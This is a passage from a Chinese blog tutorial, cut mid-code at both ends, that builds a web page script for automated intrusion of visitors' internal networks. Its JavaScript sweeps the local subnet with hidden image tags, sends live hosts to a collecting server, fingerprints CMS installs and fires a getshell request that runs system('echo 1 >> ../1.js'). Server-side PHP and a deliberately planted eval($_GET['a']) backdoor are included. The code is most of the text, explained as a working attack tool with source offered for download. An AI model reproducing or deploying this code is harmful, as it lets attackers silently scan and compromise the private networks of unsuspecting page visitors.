XMLHttpRequest();</div><div class="line">ipAjax.open(<span class="string">'POST'</span>, sendsurvivalIp, <span class="literal">false</span>);</div><div class="line">ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">ipAjax.send(<span class="string">'survivalip='</span>+ ipList.join(<span class="string">"-"</span>) + <span class="string">'&amp;onlystring='</span> + onlyString);</div></pre></td></tr></table></figure></p><p>这段代码是把当前获取到的内网IP发送到服务端，至于为什么要在ipList后面加上join(“-“)函数是因为WebRTC有时会把获取网关、VM虚拟机的IP也获取上来。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ipList.length;i++)&#123;</div><div class="line">    incompleteIp = ipList[i].split(<span class="string">"."</span>);</div><div class="line">    incompleteIp.pop();</div><div class="line">    incompleteIp = incompleteIp.join(<span class="string">"."</span>);</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">1</span>;j &lt; <span class="number">255</span>;j++)&#123;</div><div class="line">        <span class="keyword">var</span> ip = incompleteIp + <span class="string">"."</span> + j;</div><div class="line">        <span class="keyword">var</span> imgTag = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">        imgTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + ip + <span class="string">"/favicon.ico"</span>);</div><div class="line">        imgTag.setAttribute(<span class="string">"onerror"</span>,<span class="string">"javascript:deathIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</div><div class="line">        imgTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:survivalIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</div><div class="line">        imgTag.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</div><div class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(imgTag);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这段代码是遍历所有内网主机80端口的。我们来实际看下把：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/3.png" alt=""></p><p>后面的.104被我们去掉了。然后利用for循环来遍历192.168.1.1~192.168.1.254<br>现在我们来运行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ipList.length;i++)&#123;</div><div class="line">    incompleteIp = ipList[i].split(<span class="string">"."</span>);</div><div class="line">    incompleteIp.pop();</div><div class="line">    incompleteIp = incompleteIp.join(<span class="string">"."</span>);</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">1</span>;j &lt; <span class="number">255</span>;j++)&#123;</div><div class="line">        <span class="keyword">var</span> ip = incompleteIp + <span class="string">"."</span> + j;</div><div class="line">        <span class="keyword">var</span> imgTag = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">        imgTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + ip + <span class="string">"/favicon.ico"</span>);</div><div class="line">        imgTag.setAttribute(<span class="string">"onerror"</span>,<span class="string">"javascript:deathIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</div><div class="line">        imgTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:survivalIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</div><div class="line">        imgTag.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</div><div class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(imgTag);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这段代码：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/4.png" alt=""></p><p>这是控制台的效果，我们来看下DOM发生了哪些变化把：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/5.png" alt=""></p><p>这里我使用的是<code>http://192.168.1.xxx/favicon.ico</code>来判断内网哪些IP开启了80端口，并且上面运行着站点。<br>其中的<code>onerror=&quot;javascript:deathIpLIst.push(&#39;192.168.1.xxx&#39;)&quot;</code>是如果此IP没有开启80端口，或者开启了80端口，但是没有运行站点的话，就调用把当前的IP地址push到deathIpLIst变量里。如果存在的话就push到survivalIpLIst变量里，也就是这段代码：<code>onload=&quot;javascript:survivalIpLIst.push(&#39;192.168.1.1&#39;)&quot;</code><br>至于为什么要这么做呢，这里就要涉及一个坑了。浏览器是不会你加载了哪些图片就立刻告诉你哪些图片是可以访问，哪些图片是不能访问的，浏览器需要一个缓冲的时间。检测同一网段里254个主机是否存在favicon.ico，大约需要花费550000ms===550s约等于2.16535s/IP。也就是9.16多分钟。也就是全部检测完需要等待9.16分钟。这也是没办法的事，改变不了。<br>至于下面为什么要使用<code>setTimeout(&quot;iteratesIp()&quot;,20000);</code>来延迟20秒执行呢，因为WebRTC获取IP需要一定的时间，其实几秒钟就好了。但是为了提高容错率我把时间提高到20秒的时间，如果你嫌慢，可以在文章结尾下载源代码，修改。<br>还有一段代码是这样的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(deathIpLIst.length + survivalIpLIst.length == <span class="number">254</span>)&#123;</div><div class="line">        snedIteratesIpData(survivalIpLIst);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        setTimeout(<span class="built_in">arguments</span>.callee,<span class="number">5000</span>);</div><div class="line">    &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure></p><p>这就是为什么我之前要把80端口不存在的IP放到一个数组变量里，存在80端口的IP放到一个数组变量里。因为我不确定他们什么时候好，之前说的9.1分钟，只是一个大概时间，因电脑配置、内网通讯速度等其他的原因可能会提前，也可能会更慢。我无法做出保证。所以写了一段代码。下面我来说说这段代码的意思：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="comment">/*coding*/</span></div><div class="line">&#125;)();</div></pre></td></tr></table></figure></p><p>是一段匿名函数，当代码运行到此处时会立刻执行此函数。<br>函数里面首先是判断deathIpLIst.length + survivalIpLIst.length是否等于254。如果等于254则调用snedIteratesIpData函数，并把开启80端口并运行站点的IP作为参数发送过去。如果不等于说明浏览器还没有把所有的图片都给判断好。进入else分之。<br><code>setTimeout(arguments.callee,5000);</code>是延迟5秒钟运行arguments.callee。而arguments.callee的意思是当前函数。我们来实际看下：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/6.png" alt=""></p><p>console.log打印了当前的函数，当然你也可以使用setTimeout(当前的函数名(),5000);来达到此效果，但是此方法对于匿名函数没有用。因为匿名函数是不存在名称的。如果学了递归的朋友们，应该会很好理解。<br>说通俗点就是：每隔5秒钟运行此函数，直到所有img标签全部判断完成，才进行下一步的操作。</p><blockquote><h3 id="0x05确认内网存活主机的CMS信息："><a href="#0x05确认内网存活主机的CMS信息：" class="headerlink" title="0x05确认内网存活主机的CMS信息："></a>0x05确认内网存活主机的CMS信息：</h3></blockquote><p>上一节我们说到闭包里的if条件里true执行的snedIteratesIpData函数，现在我们就来说说这个函数里面是什么内容：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">snedIteratesIpData</span>(<span class="params">ip</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(deathIpLIst.length == <span class="number">254</span>)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    stage(<span class="number">2</span>)</div><div class="line">    ip = ip.join(<span class="string">"-"</span>)</div><div class="line">    ipAjax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    ipAjax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(ipAjax.readyState == <span class="number">4</span> &amp;&amp; ipAjax.status == <span class="number">200</span>)&#123;</div><div class="line">            <span class="keyword">var</span> cmsPath = <span class="built_in">JSON</span>.parse(ipAjax.responseText).path;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> cmsPath)&#123;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; survivalIpLIst.length;i++)&#123;</div><div class="line">                    <span class="keyword">var</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</div><div class="line">                    scriptTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + survivalIpLIst[i] + cmsPath[key]);</div><div class="line">                    scriptTag.setAttribute(<span class="string">"data-ipadder"</span>,survivalIpLIst[i]);</div><div class="line">                    scriptTag.setAttribute(<span class="string">"data-cmsinfo"</span>,key);</div><div class="line">                    scriptTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:vulnerabilityIpList(this)"</span>);</div><div class="line">                    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(scriptTag);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ipAjax.open(<span class="string">'POST'</span>, snedIteratesIpUrl, <span class="literal">false</span>);</div><div class="line">    ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">    ipAjax.send(<span class="string">'iplist='</span>+ip+<span class="string">'&amp;onlystring='</span>+onlyString);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>为什么要在函数开始前写上if函数呢，因为在上一节中的闭包里存在一个bug。就是当所有内网IP中都没有开放80端口且不存在站点的情况下，deathIpLIst.length会为254。而survivalIpLIst.length会为0。那<code>deathIpLIst.length + survivalIpLIst.length == 254</code>的条件是为true的。为了避免此bug的发生，我们在snedIteratesIpData函数里加入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(deathIpLIst.length == <span class="number">254</span>)&#123;</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>当deathIpLIst.length等于254的时候，返回false。不再向下执行。因为所有代码的构架就是A调用B，C调用A，D调用C。当C返回false的时候，D是不会执行的。从上面的代码可以看到，返回false后。下面的代码都不会运行的。<br>现在我们来看下<code>ip = ip.join(&quot;-&quot;)</code>这条代码的意思，是当内网中存在两条（包括两条）以上的IP地址时，使用join函数，传给服务端。方便服务端的接受及查看。服务端的反馈就像下面这样：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/7.png" alt=""></p><p>面来说说ajax请求的代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">ipAjax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">ipAjax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(ipAjax.readyState == <span class="number">4</span> &amp;&amp; ipAjax.status == <span class="number">200</span>)&#123;</div><div class="line">        <span class="keyword">var</span> cmsPath = <span class="built_in">JSON</span>.parse(ipAjax.responseText).path;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> cmsPath)&#123;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; survivalIpLIst.length;i++)&#123;</div><div class="line">                <span class="keyword">var</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</div><div class="line">                scriptTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + survivalIpLIst[i] + cmsPath[key]);</div><div class="line">                scriptTag.setAttribute(<span class="string">"data-ipadder"</span>,survivalIpLIst[i]);</div><div class="line">                scriptTag.setAttribute(<span class="string">"data-cmsinfo"</span>,key);</div><div class="line">                scriptTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:vulnerabilityIpList(this)"</span>);</div><div class="line">                <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(scriptTag);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">ipAjax.open(<span class="string">'POST'</span>, snedIteratesIpUrl, <span class="literal">false</span>);</div><div class="line">ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">ipAjax.send(<span class="string">'iplist='</span>+ip+<span class="string">'&amp;onlystring='</span>+onlyString);</div></pre></td></tr></table></figure></p><p>发送内网中开放80端口且具有站点的ip地址，并同时发送唯一标识符。用于服务端验证。<br>服务端接受后，发送json数据，服务端代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;ajaxReturn(<span class="keyword">array</span>(</div><div class="line">    <span class="string">"typeMsg"</span> =&gt; <span class="string">"success"</span>,</div><div class="line">    <span class="string">"path"</span>    =&gt; $pathInfo,</div><div class="line">));</div></pre></td></tr></table></figure></p><p>然后使用if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200)来判断是否发送成功，成功后，把json里的path数据赋值cmsPath变量。用于后面的代码调用。首先进入for循环，cmsPath[‘key’]为当前的cms路径。然后再来套一个for循环，survivalIpLIst[i]为当前循环的IP地址。<br>接下来就是建立一个script标签的DOM元素，其中的data-ipadder、data-cmsinfo是为了让后面的代码方便调用。<code>onload = &quot; javascript:vulnerabilityIpList(this)&quot;</code>是当这个地址存在的时候，调用的一个函数，下一节会说到。<br>现在先让我们看看数据库在的cmsPath是什么样的把：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/8.png" alt=""></p><p>默认就这4个，更多的路径可以自行加入。<br>为了方便测试，我在我家中的另一台电脑上部署了代码，只有index.php、/static/bbcode.js、vul/heihei.php、favicon.ico这几个文件。而在heihei.php文件里代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">   <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</div></pre></td></tr></table></figure></p><p>为什么是这个呢，很简单。我手里面没有Discuz的getshell漏洞。为了徒省事。就这样把。而favicon.ico文件我也很随意的使用了dedecms的favicon.ico。后面测试的时候，还望不要见怪。<br>现在我们来运行下代码看下会发生什么事情吧：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/9.png" alt=""></p><p>我在/static/bbcode.js文件里写入的是console.log(1)所有会在控制台反馈1。这只是测试的代码，真实的环境是不会这样的。现在我们来看下DOM元素有些改变把：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/10.png" alt=""></p><p>已经调用了，程序检测到只有<a href="http://192.168.1.103/static/js/bbcode.js符合。那么一旦成功调用js文件，就会执行onlod里的vulnerabilityIpList(this)代码。而vulnerabilityIpList函数代码就在下一节。" target="_blank" rel="external">http://192.168.1.103/static/js/bbcode.js符合。那么一旦成功调用js文件，就会执行onlod里的vulnerabilityIpList(this)代码。而vulnerabilityIpList函数代码就在下一节。</a></p><blockquote><h3 id="0x06-检测内网主机中的漏洞是否真实存在（上篇）："><a href="#0x06-检测内网主机中的漏洞是否真实存在（上篇）：" class="headerlink" title="0x06 检测内网主机中的漏洞是否真实存在（上篇）："></a>0x06 检测内网主机中的漏洞是否真实存在（上篇）：</h3></blockquote><p>下面就是vulnerabilityIpList函数的代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">vulnerabilityIpList</span>(<span class="params">info</span>)</span>&#123;</div><div class="line">    stage(<span class="number">3</span>)</div><div class="line">    ipAjax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    ipAjax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(ipAjax.readyState == <span class="number">4</span> &amp;&amp; ipAjax.status == <span class="number">200</span>)&#123;</div><div class="line">            <span class="keyword">var</span> vulCmsInfo = ipAjax.responseText;</div><div class="line">            <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">            img.setAttribute(<span class="string">"scr"</span>,vulCmsInfo);</div><div class="line">            img.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</div><div class="line">            <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(img);</div><div class="line">            setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">                <span class="keyword">var</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</div><div class="line">                scriptTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span>+info.getAttribute(<span class="string">'data-ipadder'</span>)+<span class="string">"/1.js"</span>);</div><div class="line">                scriptTag.setAttribute(<span class="string">"data-cmsinfo"</span>,info.getAttribute(<span class="string">"data-cmsinfo"</span>));</div><div class="line">                scriptTag.setAttribute(<span class="string">"data-vulip"</span>,info.getAttribute(<span class="string">'data-ipadder'</span>));</div><div class="line">                scriptTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:vulConfirm(this)"</span>);</div><div class="line">                <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(scriptTag);</div><div class="line">            &#125;,<span class="number">2000</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ipAjax.open(<span class="string">'POST'</span>, snedIteratesCmsIpUrl, <span class="literal">false</span>);</div><div class="line">    ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">    ipAjax.send(<span class="string">'existenceCmsIp='</span>+ info.getAttribute(<span class="string">"data-ipadder"</span>) + <span class="string">'&amp;existenceCmsInfo='</span> + info.getAttribute(<span class="string">"data-cmsinfo"</span>) + <span class="string">'&amp;onlystring='</span> + onlyString);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>其中info参数是成功调用的script标签的DOM元素对象。<br>首先让我们看下发送url的请求：</p><ol><li><p>existenceCmsIp参数是检测到cms类型的IP地址</p></li><li><p>existenceCmsInfo参数是检测到cms类型</p></li><li><p>onlystring参数是唯一标识符，用于服务器判断属于哪一个项目。</p></li></ol><p>接下来让我们看下onreadystatechange里面的内容：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> vulCmsInfo = ipAjax.responseText;</div><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">img.setAttribute(<span class="string">"scr"</span>,vulCmsInfo);</div><div class="line">img.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</div><div class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(img);</div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</div><div class="line">    scriptTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span>+info.getAttribute(<span class="string">'data-ipadder'</span>)+<span class="string">"/1.js"</span>);</div><div class="line">    scriptTag.setAttribute(<span class="string">"data-cmsinfo"</span>,info.getAttribute(<span class="string">"data-cmsinfo"</span>));</div><div class="line">    scriptTag.setAttribute(<span class="string">"data-vulip"</span>,info.getAttribute(<span class="string">'data-ipadder'</span>));</div><div class="line">    scriptTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:vulConfirm(this)"</span>);</div><div class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(scriptTag);</div><div class="line">&#125;,<span class="number">2000</span>);</div></pre></td></tr></table></figure></p><p>首先就是var vulCmsInfo = ipAjax.responseText;，把服务器返回的字符串赋值给vulCmsInfo变量。服务端的代码是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">* 把客户端检测到存在CMS的IP加入到数据库中</div><div class="line">*/</div><div class="line"><span class="keyword">if</span>(I(<span class="string">'post.existenceCmsIp'</span>)  == <span class="string">""</span> || I(<span class="string">'post.existenceCmsInfo'</span>) == <span class="string">""</span> || I(<span class="string">'post.onlystring'</span>) == <span class="string">""</span>)&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;ajaxReturn(<span class="keyword">array</span>(</div><div class="line">        <span class="string">"typeMsg"</span> =&gt; <span class="string">"error"</span>,</div><div class="line">    ));</div><div class="line">&#125;</div><div class="line">$existenceCmsIp               = I(<span class="string">'post.existenceCmsIp'</span>);</div><div class="line">$existenceCmsInfo             = I(<span class="string">'post.existenceCmsInfo'</span>);</div><div class="line">$onlyString                   = I(<span class="string">'post.onlystring'</span>);</div><div class="line">$existencecmsip               = M(<span class="string">'existencecmsip'</span>);</div><div class="line">$existenceData[<span class="string">'inner_ip'</span>]    = $existenceCmsIp;</div><div class="line">$existenceData[<span class="string">'cms'</span>]         = $existenceCmsInfo;</div><div class="line">$existenceData[<span class="string">'onlystring'</span>] = $onlyString;</div><div class="line">$existenceData[<span class="string">'create_time'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>);</div><div class="line">$existencecmsip-&gt;data($existenceData)-&gt;add();</div><div class="line"><span class="comment">/*</span></div><div class="line">* 获取数据库中的cms漏洞详情，发送给客户端</div><div class="line">*/</div><div class="line">$cmsvul  = M(<span class="string">'cmsvul'</span>);</div><div class="line">$vulInfo = base64_decode($cmsvul-&gt;where(<span class="string">'cms="'</span>.$existenceCmsInfo.<span class="string">'"'</span>)-&gt;getField(<span class="string">"vulinfo"</span>));</div><div class="line"><span class="keyword">echo</span> <span class="string">"http://"</span>.$existenceCmsIp.$vulInfo;从代码中可以看到服务端返回的不是json数据，而是字符串，这个字符串是拼接好的url。这个url就是从获取到的IP地址加上服务器中调用属于cms漏洞的path路径。</div></pre></td></tr></table></figure></p><p>然后使用img标签来发送get请求，用于触发此getshell漏洞。代码也就是：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">img.setAttribute(<span class="string">"scr"</span>,vulCmsInfo);</div><div class="line">img.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</div><div class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(img);</div></pre></td></tr></table></figure></p><p>至于为什么要使用setTimeout函数来延迟2秒钟执行，是因为之前也说过浏览器是无法同时判断那么多的img请求。因为这里只有一个所以我使用了2秒，真实情况下可以改为20秒。<br>然后建立一个script标签，用于判断1.js是否生成成功，如果生成成功，就说明漏洞存在，交给下一个函数处理，如果不存在，就此打住。因为onload不会调用vulConfirm函数。<br>至于为什么要判断1.js文件，就是我之前所说的getshell生成的代码。在数据中是这样的：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/11.png" alt=""></p><p>是一段base64密文，解开后，内容如下：<code>/vul/heihei.php?a=system(&#39;echo 1 &gt;&gt; ../1.js&#39;);</code><br>而在后端发送给前端的时候，我已经解密了。如同上面代码中：<br><code>$vulInfo = base64_decode($cmsvul-&gt;where(&#39;cms=&quot;&#39;.$existenceCmsInfo.&#39;&quot;&#39;)-&gt;getField(&quot;vulinfo&quot;));</code><br>而在浏览器中代码是这样：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/12.png" alt=""></p><p>接下来就是setTimeout函数的真正的用处了。请注意这段代码：<br><code>scriptTag.setAttribute(&quot;src&quot;,&quot;http://&quot;+info.getAttribute(&#39;data-ipadder&#39;)+&quot;/1.js&quot;);</code><br>在script中把src的赋值成检测目标站点是否存在1.js。如果存在就运行onload里的vulConfirm函数。而vulConfirm函数就在下一节。</p><blockquote><h3 id="0x07-检测内网主机中的漏洞是否真实存在（下篇）："><a href="#0x07-检测内网主机中的漏洞是否真实存在（下篇）：" class="headerlink" title="0x07 检测内网主机中的漏洞是否真实存在（下篇）："></a>0x07 检测内网主机中的漏洞是否真实存在（下篇）：</h3></blockquote><p>vulConfirm函数的内容很简单，只有给服务端发送的代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">vulConfirm</span>(<span class="params">cmsConfirmInfo</span>)</span>&#123;</div><div class="line">    stage(<span class="number">4</span>)</div><div class="line">    ipAjax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    ipAjax.open(<span class="string">'POST'</span>, sendExistenceVul, <span class="literal">false</span>);</div><div class="line">    ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">    ipAjax.send(<span class="string">'cms='</span>+ cmsConfirmInfo.getAttribute(<span class="string">"data-cmsinfo"</span>) + <span class="string">'&amp;vulip='</span>+ cmsConfirmInfo.getAttribute(<span class="string">"data-vulip"</span>) +<span class="string">'&amp;onlystring='</span> + onlyString);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><ol><li>cms参数是存在漏洞的CMS信息</li><li>vulip是存在漏洞的IP地址</li><li>onlystring是唯一标识符，用于服务端判断</li></ol><blockquote><h3 id="0x08-stage的作用："><a href="#0x08-stage的作用：" class="headerlink" title="0x08 stage的作用："></a>0x08 stage的作用：</h3></blockquote><p>stage函数代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">stage</span>(<span class="params">num</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> updataStage = <span 